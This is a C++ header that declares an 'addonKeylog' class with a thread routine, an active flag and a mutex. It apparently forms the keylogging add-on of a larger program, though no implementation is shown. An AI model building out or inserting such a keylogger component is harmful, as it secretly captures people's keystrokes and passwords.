#pragma once



#include "addon.h"





class addonKeylog
{

public:

	static void Thread();

	addonKeylog();
	~addonKeylog();

	bool threadActive;

	boost::mutex Mutex;
};